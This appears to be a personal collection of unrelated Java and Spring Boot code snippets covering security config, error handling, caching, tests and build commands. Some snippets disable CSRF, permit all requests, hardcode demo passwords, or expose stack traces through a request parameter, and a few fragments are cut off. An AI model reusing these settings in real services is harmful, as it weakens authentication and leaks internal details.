    Predicates.not(PathSelectors.regex("/error.*"))
    ;
    }
}
--------------------------------------------------------------------------------------------------------
.authorizeExchange()
    .pathMatchers(HttpMethod.DELETE).denyAll()
    .pathMatchers("/login", "/logout").permitAll()
    .pathMatchers(HttpMethod.GET, "/managers-can-see-this-folder/**", "/and-this-page")
	    .hasRole("MANAGER")
    .matchers(exchange -> new MediaTypeServerWebExchangeMatcher(MediaType.APPLICATION_PDF).matches(exchange))
	    .hasRole("ADMIN")
    .anyExchange().authenticated()
	
.formLogin()
    .loginPage("/login")
    .authenticationFailureHandler((exchange, exception) -> Mono.error(exception))
    .authenticationSuccessHandler(new WebFilterChainServerAuthenticationSuccessHandler());
	
.exceptionHandling()
    .authenticationEntryPoint((exchange, exception) -> Mono.error(exception))
    .accessDeniedHandler((exchange, exception) -> Mono.error(exception))
	
@Bean
public SecurityWebFilterChain springSecurityFilterChain(ServerHttpSecurity http) {
    return http
		.authorizeExchange()
			.anyExchange().permitAll()
		.and().formLogin()
			.loginPage("/login")
			.authenticationFailureHandler((exchange, exception) -> Mono.error(exception))
			.authenticationSuccessHandler(new WebFilterChainServerAuthenticationSuccessHandler())
		.and()
			.securityContextRepository(NoOpServerSecurityContextRepository.getInstance())
		.exceptionHandling()
			.authenticationEntryPoint((exchange, exception) -> Mono.error(exception))
			.accessDeniedHandler((exchange, exception) -> Mono.error(exception))
		.and()
			.csrf().disable()
		.logout().disable()
		.build();
}

@PreAuthorize("hasPermission(#user, 'edit')")
public Mono<Void> processUser(Mono<User> user) {
   ...
}
--------------------------------------------------------------------------------------------------------
import com.octoperf.auth.api.UserAuthenticationService;
import com.octoperf.user.entity.User;
import lombok.AllArgsConstructor;
import lombok.NonNull;
import lombok.experimental.FieldDefaults;
import org.springframework.security.core.annotation.AuthenticationPrincipal;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import static lombok.AccessLevel.PACKAGE;
import static lombok.AccessLevel.PRIVATE;

@RestController
@RequestMapping("/users")
@FieldDefaults(level = PRIVATE, makeFinal = true)
@AllArgsConstructor(access = PACKAGE)
final class SecuredUsersController {
  @NonNull
  UserAuthenticationService authentication;

  @GetMapping("/current")
  User getCurrent(@AuthenticationPrincipal final User user) {
    return user;
  }

  @GetMapping("/logout")
  boolean logout(@AuthenticationPrincipal final User user) {
    authentication.logout(user);
    return true;
  }
}
--------------------------------------------------------------------------------------------------------
    public Iterable<VersionEntity> searchVersionsRecords(final String searchText, int pageNumber, int pageSize) {
        final FullTextQuery jpaQuery = this.searchVersionsChangelogQuery(searchText);
        jpaQuery.setMaxResults(pageSize);
        jpaQuery.setFirstResult((pageNumber - 1) * pageSize);
        return jpaQuery.getResultList();
    }

    public int searchVersionsRecordsTotalCount(final String searchText) {
        final FullTextQuery jpaQuery = this.searchVersionsChangelogQuery(searchText);
        return jpaQuery.getResultSize();
    }

    private FullTextQuery searchVersionsChangelogQuery(final String searchText) {
        final FullTextEntityManager fullTextEntityManager = Search.getFullTextEntityManager(this.getEntityManager());
        final QueryBuilder queryBuilder = fullTextEntityManager.getSearchFactory()
                .buildQueryBuilder()
                .forEntity(VersionEntity.class)
                .get();
        final org.apache.lucene.search.Query luceneQuery = queryBuilder
                .keyword()
                .wildcard()
                .onField("changelog")
                .boostedTo(5f)
                .matching(searchText + "*")
                .createQuery();
        return fullTextEntityManager.createFullTextQuery(luceneQuery, VersionEntity.class);
    }
--------------------------------------------------------------------------------------------------------
WADL
RESTDocs
Swagger or OpenDocs
--------------------------------------------------------------------------------------------------------
server:
  port: ${PORT:8081}

messages:
  home: Hello, Memorynotfound!

spring:
  thymeleaf:
    cache: false
    check-template: true
    check-template-location: true
    content-type: text/html
    enabled: true
    encoding: UTF-8
    # excluded-view-names:
    # mode: HTML5
    # prefix: /templates/
    # suffix: .html
    # template-resolver-order:
    # view-names:

logging:
  level:
      - ".=info"
      - "com.memorynotfound=debug"
      - "org.springframework=info"
--------------------------------------------------------------------------------------------------------
<dependencies>
    <dependency>
        <groupId>com.naturalprogrammer.spring-lemon</groupId>
        <artifactId>spring-lemon-exceptions</artifactId>
        <version>1.0.0.M6</version>
    </dependency>
</dependencies>
--------------------------------------------------------------------------------------------------------
# ln -s /home/ec2-user/reservation-microservice-0.0.1-SNAPSHOT.jar /etc/init.d/springApp
# /etc/init.d/springApp
Usage: /etc/init.d/springApp {start|stop|force-stop|restart|force-reload|status|run}
--------------------------------------------------------------------------------------------------------
@SpringBootApplication
public class Application implements WebServerFactoryCustomizer<ConfigurableServletWebServerFactory> {

    @Override
    public void customize(ConfigurableServletWebServerFactory factory) {
        factory.addErrorPages(new ErrorPage(HttpStatus.FORBIDDEN, "/errors/403.html"));
        factory.addErrorPages(new ErrorPage(HttpStatus.NOT_FOUND, "/errors/404.html"));
        factory.addErrorPages(new ErrorPage("/errors/500.html"));
    }

}


import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.autoconfigure.web.ErrorAttributes;
import org.springframework.boot.autoconfigure.web.ErrorController;
import org.springframework.util.Assert;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.request.RequestAttributes;
import org.springframework.web.context.request.ServletRequestAttributes;

import javax.servlet.http.HttpServletRequest;
import java.util.Map;

@RestController
@RequestMapping("/error")
public class SimpleErrorController implements ErrorController {

  private final ErrorAttributes errorAttributes;

  @Autowired
  public SimpleErrorController(ErrorAttributes errorAttributes) {
    Assert.notNull(errorAttributes, "ErrorAttributes must not be null");
    this.errorAttributes = errorAttributes;
  }

  @Override
  public String getErrorPath() {
    return "/error";
  }

  @RequestMapping
  public Map<String, Object> error(HttpServletRequest aRequest){
     Map<String, Object> body = getErrorAttributes(aRequest,getTraceParameter(aRequest));
     String trace = (String) body.get("trace");
     if(trace != null){
       String[] lines = trace.split("\n\t");
       body.put("trace", lines);
     }
     return body;
  }

  private boolean getTraceParameter(HttpServletRequest request) {
    String parameter = request.getParameter("trace");
    if (parameter == null) {
        return false;
    }
    return !"false".equals(parameter.toLowerCase());
  }

  private Map<String, Object> getErrorAttributes(HttpServletRequest aRequest, boolean includeStackTrace) {
    RequestAttributes requestAttributes = new ServletRequestAttributes(aRequest);
    return errorAttributes.getErrorAttributes(requestAttributes, includeStackTrace);
  }
}



--------------------------------------------------------------------------------------------------------
package com.octoperf.demo;

import okhttp3.Credentials;
import okhttp3.Interceptor;
import okhttp3.Request;
import okhttp3.Response;

import java.io.IOException;

final class BasicAuthInterceptor implements Interceptor {

  private final String credentials;

  BasicAuthInterceptor(final String user, final String password) {
    this.credentials = Credentials.basic(user, password);
  }

  @Override
  public Response intercept(Chain chain) throws IOException {
    final Request request = chain.request();
    final Request authenticatedRequest = request.newBuilder()
      .header("Authorization", credentials).build();
    return chain.proceed(authenticatedRequest);
  }
}

import com.fasterxml.jackson.databind.ObjectMapper;
import okhttp3.Credentials;
import okhttp3.Interceptor;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.context.junit4.SpringRunner;
import retrofit2.Retrofit;
import retrofit2.converter.jackson.JacksonConverterFactory;

import java.io.IOException;

import static org.junit.Assert.assertEquals;
import static org.springframework.boot.test.context.SpringBootTest.WebEnvironment.RANDOM_PORT;

@RunWith(SpringRunner.class)
@SpringBootTest(classes = { DemoApplication.class }, webEnvironment = RANDOM_PORT)
public class PersonControllerRetrofitTest {

  @Value("${local.server.port}")
  private int port;

  private Retrofit retrofit;

  @Before
  public void setUp() {
    final OkHttpClient client = new OkHttpClient.Builder()
      .addInterceptor(new BasicAuthInterceptor("admin", "passw0rd"))
      .build();

    retrofit = new Retrofit.Builder()
      .baseUrl("http://localhost:"+port)
      .client(client)
      .addConverterFactory(JacksonConverterFactory.create(new ObjectMapper()))
      .build();
  }

  @Test
  public void shouldSayHello() throws IOException {
    final PersonApi api = retrofit.create(PersonApi.class);
    final Person person = api.johnSmith().execute().body();
    assertEquals("John", person.getFirstname());
    assertEquals("Smith", person.getLastname());
  }
}

@Controller
@RequestMapping("/")
public class RedirectController {
     
    @GetMapping("/redirectWithRedirectView")
    public RedirectView redirectWithUsingRedirectView(
      RedirectAttributes attributes) {
        attributes.addFlashAttribute("flashAttribute", "redirectWithRedirectView");
        attributes.addAttribute("attribute", "redirectWithRedirectView");
        return new RedirectView("redirectedUrl");
    }
}

@Controller
@RequestMapping("/")
public class RedirectController {
     
    @GetMapping("/redirectWithRedirectPrefix")
    public ModelAndView redirectWithUsingRedirectPrefix(ModelMap model) {
        model.addAttribute("attribute", "redirectWithRedirectPrefix");
        return new ModelAndView("redirect:/redirectedUrl", model);
    }
}

@PostMapping("/redirectPostToPost")
public ModelAndView redirectPostToPost(HttpServletRequest request) {
    request.setAttribute(
      View.RESPONSE_STATUS_ATTRIBUTE, HttpStatus.TEMPORARY_REDIRECT);
    return new ModelAndView("redirect:/redirectedPostToPost");
}

@PostMapping("/redirectedPostToPost")
public ModelAndView redirectedPostToPost() {
    return new ModelAndView("redirection");
}

curl -L --verbose -X POST http://localhost:8080/spring-rest/redirectPostToPost
--------------------------------------------------------------------------------------------------------
@Configuration
public class SslWebSecurityConfigurerAdapter extends WebSecurityConfigurerAdapter {

	@Override
	protected void configure(HttpSecurity http) throws Exception {
		// Customize the application security
		http.requiresChannel().anyRequest().requiresSecure();
	}
}

@Entity
@RevisionEntity(AuditRevisionListener.class)
@Table(name = "REVINFO", schema = "audit")
@AttributeOverrides({
        @AttributeOverride(name = "timestamp", column = @Column(name = "REVTSTMP")),
        @AttributeOverride(name = "id", column = @Column(name = "REV"))})
@Getter
@Setter
public class AuditRevisionEntity extends DefaultRevisionEntity {

    @Column(name = "USERNAME", nullable = false)
    private String username;
}
public class AuditRevisionListener implements RevisionListener {

    @Override
    public void newRevision(Object revisionEntity) {
        AuditRevisionEntity audit = (AuditRevisionEntity) revisionEntity;
        audit.setUsername("admin");
    }
}

ll create it's own tables in the PUBLIC schema, regardless - before applying any changesets:
If you run 
--------------------------------------------------------------------------------------------------------
@Test
public void onAuthenticationSuccessHasSavedRequest() throws Exception {
    String redirectUrl = "http://localhost/appcontext/page";
    RedirectStrategy redirectStrategy = mock(RedirectStrategy.class);
    RequestCache requestCache = mock(RequestCache.class);
    SavedRequest savedRequest = mock(SavedRequest.class);
    MockHttpServletRequest request = new MockHttpServletRequest();
    MockHttpServletResponse response = new MockHttpServletResponse();
    when(savedRequest.getRedirectUrl()).thenReturn(redirectUrl);
    when(requestCache.getRequest(request, response)).thenReturn(savedRequest);
    SavedRequestAwareAuthenticationSuccessHandler handler = new SavedRequestAwareAuthenticationSuccessHandler();
    handler.setRequestCache(requestCache);
    handler.setRedirectStrategy(redirectStrategy);
    handler.onAuthenticationSuccess(request, response, mock(Authentication.class));
    verify(redirectStrategy).sendRedirect(request, response, redirectUrl);
}
--------------------------------------------------------------------------------------------------------
import org.springframework.boot.web.servlet.error.DefaultErrorAttributes;
import org.springframework.stereotype.Component;
import org.springframework.web.context.request.WebRequest;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Map;

@Component
public class CustomErrorAttributes extends DefaultErrorAttributes {

    private static final DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");

    @Override
    public Map<String, Object> getErrorAttributes(WebRequest webRequest, boolean includeStackTrace) {

        // Let Spring handle the error first, we will modify later :)
        Map<String, Object> errorAttributes = super.getErrorAttributes(webRequest, includeStackTrace);

        // format & update timestamp
        Object timestamp = errorAttributes.get("timestamp");
        if (timestamp == null) {
            errorAttributes.put("timestamp", dateFormat.format(new Date()));
        } else {
            errorAttributes.put("timestamp", dateFormat.format((Date) timestamp));
        }

        // insert a new key
        errorAttributes.put("version", "1.2");

        return errorAttributes;

    }

}
--------------------------------------------------------------------------------------------------------
@RunWith(SpringRunner.class)
@SpringBootTest(webEnvironment = SprintBootTest.WebEnvironment.RANDOM_PORT)
@AutoConfigureMockMvc
@ActiveProfiles("dev")
public class GlobalExceptionHandlerIntegrationTest {

    public static final String ISO8601_DATE_REGEX =
        "^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}\\.\\d{3}Z$";

    @Autowired
    private MockMvc mockMvc;

    @Test
    @WithMockUser(roles = "DEVICE_SCAN_HOSTS")
    public void invalidUrl_returnsHttp404() throws Exception {
        RequestBuilder requestBuilder = getGetRequestBuilder("/does-not-exist");
        mockMvc.perform(requestBuilder)
            .andExpect(status().isNotFound())
            .andExpect(jsonPath("$.code", is(1000)))
            .andExpect(jsonPath("$.message", is("No handler found for your request.")))
            .andExpect(jsonPath("$.timestamp", RegexMatcher.matchesRegex(ISO8601_DATE_REGEX)));
    }

    private RequestBuilder getGetRequestBuilder(String url) {
        return MockMvcRequestBuilders
            .get(url)
            .accept(MediaType.APPLICATION_JSON);
    }
--------------------------------------------------------------------------------------------------------
// NEW CODE ABOVE REPLACES THIS! (2015-12-04)
@Configuration
public class MyAppConfig {
    @Bean  // Magic entry 
    public DispatcherServlet dispatcherServlet() {
        DispatcherServlet ds = new DispatcherServlet();
        ds.setThrowExceptionIfNoHandlerFound(true);
        return ds;
    }
}
--------------------------------------------------------------------------------------------------------
    static {
        final HibernateValidatorConfiguration config = Validation.byProvider(HibernateValidator.class).configure();
        final ConstraintMapping constraintMapping = config.createConstraintMapping();
        constraintMapping.constraintDefinition(URL.class).includeExistingValidators(false).validatedBy(URLValidator.class);
        config.addMapping(constraintMapping);

        final ValidatorFactory validatorFactory = config.buildValidatorFactory();
        validator = validatorFactory.usingContext().getValidator();
        validatorFactory.close();
    }
--------------------------------------------------------------------------------------------------------
    /**
     * Default parsing patterns
     */
    private static final String UPPER = "\\p{Lu}|\\P{InBASIC_LATIN}";
    private static final String LOWER = "\\p{Ll}";
    private static final String CAMEL_CASE_REGEX = "(?<!(^|[%u_$]))(?=[%u])|(?<!^)(?=[%u][%l])".replace("%u", UPPER).replace("%l", LOWER);
    /**
     * Default camel case {@link Pattern}
     */
    private static final Pattern CAMEL_CASE = Pattern.compile(CAMEL_CASE_REGEX);
	
	    /**
     * Returns {@link List} by input source {@link String} and 
     * @param source
     * @param toLower
     * @return
     */
    private static List<String> split(final String source, final boolean toLower) {
        Objects.requireNonNull(source, "Source string must not be null!");
        final List<String> result = CAMEL_CASE.splitAsStream(source).map(i -> toLower ? i.toLowerCase() : i).collect(Collectors.toList());
        return Collections.unmodifiableList(result);
    }
--------------------------------------------------------------------------------------------------------
import org.springframework.cache.Cache;
import org.springframework.cache.CacheManager;
import org.springframework.cache.annotation.EnableCaching;
import org.springframework.cache.concurrent.ConcurrentMapCache;
import org.springframework.cache.concurrent.ConcurrentMapCacheManager;
import org.springframework.cache.support.SimpleCacheManager;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

import static java.util.Arrays.asList;

@Configuration
@EnableCaching
public class MailCacheConfiguration {

    /**
     * Default mail cache names
     */
    public static final String DEFAULT_MAIL_FOLDER_CACHE = "MAIL_FOLDER_CACHE";
    public static final String DEFAULT_MAIL_STORE_CACHE = "MAIL_STORE_CACHE";

//    @Bean
//    public CacheManager cacheManager() {
//        final SimpleCacheManager cacheManager = new SimpleCacheManager();
//        cacheManager.setCaches(asList(this.mailFolderCache(), this.mailStoreCache()));
//        cacheManager.afterPropertiesSet();
//        return cacheManager;
//    }

    @Bean
    public CacheManager cacheManager() {
        final ConcurrentMapCacheManager cacheManager = new ConcurrentMapCacheManager("addresses");
        cacheManager.setAllowNullValues(false);
        cacheManager.setCacheNames(asList(DEFAULT_MAIL_FOLDER_CACHE, DEFAULT_MAIL_STORE_CACHE));
        return cacheManager;
    }

    @Bean
    public Cache mailFolderCache() {
        return new ConcurrentMapCache(DEFAULT_MAIL_FOLDER_CACHE);
    }

    @Bean
    public Cache mailStoreCache() {
        return new ConcurrentMapCache(DEFAULT_MAIL_STORE_CACHE);
    }
}
--------------------------------------------------------------------------------------------------------
@CacheEvict(value = {DEFAULT_MAIL_FOLDER_CACHE, DEFAULT_MAIL_STORE_CACHE}, allEntries = true)
public void destroy() {
}
	
@Caching(evict = { 
  @CacheEvict("addresses"), 
  @CacheEvict(value="directory", key="#customer.name") })
public String getAddress(Customer customer) {...}
--------------------------------------------------------------------------------------------------------
/*
 * Copyright 2012-2018 the original author or authors.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package org.springframework.boot.autoconfigure.jdbc;

import javax.sql.DataSource;
import javax.sql.XADataSource;

import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.boot.autoconfigure.condition.AnyNestedCondition;
import org.springframework.boot.autoconfigure.condition.ConditionMessage;
import org.springframework.boot.autoconfigure.condition.ConditionOutcome;
import org.springframework.boot.autoconfigure.condition.ConditionalOnClass;
import org.springframework.boot.autoconfigure.condition.ConditionalOnMissingBean;
import org.springframework.boot.autoconfigure.condition.ConditionalOnProperty;
import org.springframework.boot.autoconfigure.condition.SpringBootCondition;
import org.springframework.boot.autoconfigure.jdbc.metadata.DataSourcePoolMetadataProvidersConfiguration;
import org.springframework.boot.context.properties.EnableConfigurationProperties;
import org.springframework.boot.jdbc.DataSourceBuilder;
import org.springframework.boot.jdbc.EmbeddedDatabaseConnection;
import org.springframework.context.annotation.Condition;
import org.springframework.context.annotation.ConditionContext;
import org.springframework.context.annotation.Conditional;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Import;
import org.springframework.core.type.AnnotatedTypeMetadata;
import org.springframework.jdbc.datasource.embedded.EmbeddedDatabaseType;

/**
 * {@link EnableAutoConfiguration Auto-configuration} for {@link DataSource}.
 *
 * @author Dave Syer
 * @author Phillip Webb
 * @author Stephane Nicoll
 * @author Kazuki Shimizu
 */
@Configuration
@ConditionalOnClass({ DataSource.class, EmbeddedDatabaseType.class })
@EnableConfigurationProperties(DataSourceProperties.class)
@Import({ DataSourcePoolMetadataProvidersConfiguration.class,
		DataSourceInitializationConfiguration.class })
public class DataSourceAutoConfiguration {

	@Configuration
	@Conditional(EmbeddedDatabaseCondition.class)
	@ConditionalOnMissingBean({ DataSource.class, XADataSource.class })
	@Import(EmbeddedDataSourceConfiguration.class)
	protected static class EmbeddedDatabaseConfiguration {

	}

	@Configuration
	@Conditional(PooledDataSourceCondition.class)
	@ConditionalOnMissingBean({ DataSource.class, XADataSource.class })
	@Import({ DataSourceConfiguration.Hikari.class, DataSourceConfiguration.Tomcat.class,
			DataSourceConfiguration.Dbcp2.class, DataSourceConfiguration.Generic.class,
			DataSourceJmxConfiguration.class })
	protected static class PooledDataSourceConfiguration {

	}

	/**
	 * {@link AnyNestedCondition} that checks that either {@code spring.datasource.type}
	 * is set or {@link PooledDataSourceAvailableCondition} applies.
	 */
	static class PooledDataSourceCondition extends AnyNestedCondition {

		PooledDataSourceCondition() {
			super(ConfigurationPhase.PARSE_CONFIGURATION);
		}

		@ConditionalOnProperty(prefix = "spring.datasource", name = "type")
		static class ExplicitType {

		}

		@Conditional(PooledDataSourceAvailableCondition.class)
		static class PooledDataSourceAvailable {

		}

	}

	/**
	 * {@link Condition} to test if a supported connection pool is available.
	 */
	static class PooledDataSourceAvailableCondition extends SpringBootCondition {

		@Override
		public ConditionOutcome getMatchOutcome(ConditionContext context,
				AnnotatedTypeMetadata metadata) {
			ConditionMessage.Builder message = ConditionMessage
					.forCondition("PooledDataSource");
			if (getDataSourceClassLoader(context) != null) {
				return ConditionOutcome
						.match(message.foundExactly("supported DataSource"));
			}
			return ConditionOutcome
					.noMatch(message.didNotFind("supported DataSource").atAll());
		}

		/**
		 * Returns the class loader for the {@link DataSource} class. Used to ensure that
		 * the driver class can actually be loaded by the data source.
		 * @param context the condition context
		 * @return the class loader
		 */
		private ClassLoader getDataSourceClassLoader(ConditionContext context) {
			Class<?> dataSourceClass = DataSourceBuilder
					.findType(context.getClassLoader());
			return (dataSourceClass != null) ? dataSourceClass.getClassLoader() : null;
		}

	}

	/**
	 * {@link Condition} to detect when an embedded {@link DataSource} type can be used.
	 * If a pooled {@link DataSource} is available, it will always be preferred to an
	 * {@code EmbeddedDatabase}.
	 */
	static class EmbeddedDatabaseCondition extends SpringBootCondition {

		private final SpringBootCondition pooledCondition = new PooledDataSourceCondition();

		@Override
		public ConditionOutcome getMatchOutcome(ConditionContext context,
				AnnotatedTypeMetadata metadata) {
			ConditionMessage.Builder message = ConditionMessage
					.forCondition("EmbeddedDataSource");
			if (anyMatches(context, metadata, this.pooledCondition)) {
				return ConditionOutcome
						.noMatch(message.foundExactly("supported pooled data source"));
			}
			EmbeddedDatabaseType type = EmbeddedDatabaseConnection
					.get(context.getClassLoader()).getType();
			if (type == null) {
				return ConditionOutcome
						.noMatch(message.didNotFind("embedded database").atAll());
			}
			return ConditionOutcome.match(message.found("embedded database").items(type));
		}
	}
}
--------------------------------------------------------------------------------------------------------
"C:\Program Files\Java\jdk1.8.0_191\bin\java.exe" -Dmaven.multiModuleProjectDirectory=C:\git-project\paragon.microservices.crmmailadapter\service "-Dmaven.home=C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\plugins\maven\lib\maven3" "-Dclassworlds.conf=C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\plugins\maven\lib\maven3\bin\m2.conf" "-javaagent:C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\lib\idea_rt.jar=23825:C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\bin" -Dfile.encoding=UTF-8 -classpath "C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\plugins\maven\lib\maven3\boot\plexus-classworlds-2.5.2.jar" org.codehaus.classworlds.Launcher -Didea.version=2018.3.5 -DskipTests=true com.github.markusmo3.urm:urm-maven-plugin:1.4.4:map
--------------------------------------------------------------------------------------------------------
java -jar plantuml-dependency-cli-1.4.0.jar -h
	java -jar plantuml-dependency-cli-1.4.0.jar -o /home/test/plantuml.txt -b . -dp ^(?!net.sourceforge.plantumldependency)(.+)$ -v
	java -jar plantuml-dependency-cli-1.4.0.jar -o /home/test/plantuml.txt -b . -i **/*.java -e **/*Test*.java -dn .*Test.* -v
	java -jar plantuml-dependency-cli-1.4.0.jar -o /home/test/plantuml.txt -b . -i **/*.java -e **/*Test*.java -dt implementations,interfaces,extensions,imports,static_imports
	java -jar plantuml-dependency-cli-1.4.0.jar -o myoutput.txt -b "C:\Users\PlantUML test" -i **/*Test.java
	java -jar plantuml-dependency-cli-1.4.0.jar -version -v
--------------------------------------------------------------------------------------------------------
https://search.maven.org/search?q=g:de.elnarion.util

"C:\Program Files\Java\jdk1.8.0_191\bin\java.exe" -Dmaven.multiModuleProjectDirectory=C:\git-project\paragon.microservices.crmmailadapter\service "-Dmaven.home=C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\plugins\maven\lib\maven3" "-Dclassworlds.conf=C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\plugins\maven\lib\maven3\bin\m2.conf" "-javaagent:C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\lib\idea_rt.jar=5944:C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\bin" -Dfile.encoding=UTF-8 -classpath "C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\plugins\maven\lib\maven3\boot\plexus-classworlds-2.5.2.jar" org.codehaus.classworlds.Launcher -Didea.version=2018.3.5 -DskipTests=true org.springframework.boot:spring-boot-maven-plugin:2.1.4.RELEASE:build-info
"C:\Program Files\Java\jdk1.8.0_191\bin\java.exe" -Dmaven.multiModuleProjectDirectory=C:\git-project\paragon.microservices.crmmailadapter\service "-Dmaven.home=C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\plugins\maven\lib\maven3" "-Dclassworlds.conf=C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\plugins\maven\lib\maven3\bin\m2.conf" "-javaagent:C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\lib\idea_rt.jar=5944:C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\bin" -Dfile.encoding=UTF-8 -classpath "C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\plugins\maven\lib\maven3\boot\plexus-classworlds-2.5.2.jar" org.codehaus.classworlds.Launcher -Didea.version=2018.3.5 -DskipTests=true -Dparse.thePackage="com.paragon.microservices.crmmailadapter.mail.chain" com.github.juanmf:java2PlantUML-maven-plugin:1.0.1:parse
mvn   -Dparse.thePackage="com.paragon.microservices.crmmailadapter.mail.chain, com.paragon.microservices.crmmailadapter.mail.chain.impl, com.paragon.microservices.crmmailadapter.mail.model, com.paragon.microservices.crmmailadapter.mail.model.enumeration, com.paragon.microservices.crmmailadapter.mail.model.constant, com.paragon.microservices.crmmailadapter.mail.model.builder, com.paragon.microservices.crmmailadapter.mail.parser, com.paragon.microservices.crmmailadapter.mail.parser.impl, com.paragon.microservices.crmmailadapter.mail.parser.impl.header, com.paragon.microservices.crmmailadapter.mail.parser.impl.body" clean compile java2PlantUML:parse
--------------------------------------------------------------------------------------------------------
org.slf4j.simpleLogger.defaultLogLevel=info
org.slf4j.simpleLogger.showDateTime=false
org.slf4j.simpleLogger.showThreadName=false
org.slf4j.simpleLogger.showLogName=false
org.slf4j.simpleLogger.logFile=System.out
org.slf4j.simpleLogger.levelInBrackets=true
org.slf4j.simpleLogger.log.Sisu=info
org.slf4j.simpleLogger.warnLevelString=WARNING
--------------------------------------------------------------------------------------------------------
spring:
  # (DataSourceAutoConfiguration & DataSourceProperties)
  datasource:
    name: ds-h2
    url: jdbc:h2:D:/work/workspace/fdata;DATABASE_TO_UPPER=false
    username: h2
    password: h2
    driver-class: org.h2.Driver
	
@Configuration
@Component
public class DataSourceBean {

    @ConfigurationProperties(prefix = "spring.datasource")
    @Bean
    @Primary
    public DataSource getDataSource() {
        return DataSourceBuilder
                .create()
//                .url("jdbc:h2:D:/work/workspace/fork/gs-serving-web-content/initial/data/fdata;DATABASE_TO_UPPER=false")
//                .username("h2")
//                .password("h2")
//                .driverClassName("org.h2.Driver")
                .build();
    }
}
--------------------------------------------------------------------------------------------------------
https://<API key>@api.keycdn.com/zones/purge/<zone id>.json
--------------------------------------------------------------------------------------------------------
@GET
@Produces({"application/xml", "application/json"})
@Path("/recent/region/{regionName}/{orderLineId}")
public List<LiveSalesList> findRecentRegionFrom(@PathParam("regionName") String regionName, @PathParam("orderLineId") Integer orderLineId) {
    CriteriaBuilder cb = getEntityManager().getCriteriaBuilder();
    javax.persistence.criteria.CriteriaQuery cq = cb.createQuery();
    Root<LiveSalesList> liveSalesList = cq.from(LiveSalesList.class);
    cq.select(liveSalesList);
    cq.where(cb.and(
        cb.equal(liveSalesList.get(LiveSalesList_.region), regionName),
        cb.gt(liveSalesList.get(LiveSalesList_.orderLineId), orderLineId)
    ));
    Query q = getEntityManager().createQuery(cq);
    q.setMaxResults(500);
    return q.getResultList();
}
--------------------------------------------------------------------------------------------------------
import org.springframework.boot.Banner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.WebApplicationType;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.autoconfigure.domain.EntityScan;
import org.springframework.context.annotation.ComponentScan;
import springfox.documentation.swagger2.annotations.EnableSwagger2;

@SpringBootApplication
@EnableAutoConfiguration
@EnableSwagger2
@ComponentScan(basePackages = {"io.project"})
@EntityScan("io.project.domain")
public class Application {

    public static void main(String[] args) {
        final SpringApplication application = new SpringApplication(Application.class);
        application.setBannerMode(Banner.Mode.OFF);
        application.setWebApplicationType(WebApplicationType.SERVLET);
        application.run(args);
    }
}
--------------------------------------------------------------------------------------------------------
#!/bin/bash

###
# #%L
# che-starter
# %%
# Copyright (C) 2017 Red Hat, Inc.
# %%
# All rights reserved. This program and the accompanying materials
# are made available under the terms of the Eclipse Public License v1.0
# which accompanies this distribution, and is available at
# http://www.eclipse.org/legal/epl-v10.html
# #L%
###

echo "Installing certificate into $CHE_STARTER_HOME/InstallCert/ directory"

# Import the certificate
cd $CHE_STARTER_HOME/InstallCert/

echo "Import the remote certificate from ${OSO_ADDRESS}"
java InstallCert $OSO_ADDRESS << ANSWERS
1
ANSWERS

echo "Export the certificate into the keystore for ${OSO_DOMAIN_NAME}"
keytool -exportcert -alias $OSO_DOMAIN_NAME-1 -keystore jssecacerts -storepass changeit -file $KUBERNETES_CERTS_CA_FILE

cd $CHE_STARTER_HOME/


exec java -Djava.security.egd=file:/dev/./urandom -jar ${CHE_STARTER_HOME}/app.jar $@
exit $?
--------------------------------------------------------------------------------------------------------
public static void main(String[] args) {
  Optional<Integer> maxAge = employeeList
      .stream()
      .collect(Collectors.mapping((Employee emp) -> emp.getAge(), Collectors.maxBy(Integer::compareTo)));
  System.out.println("Max Age: " + maxAge.get());
}
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
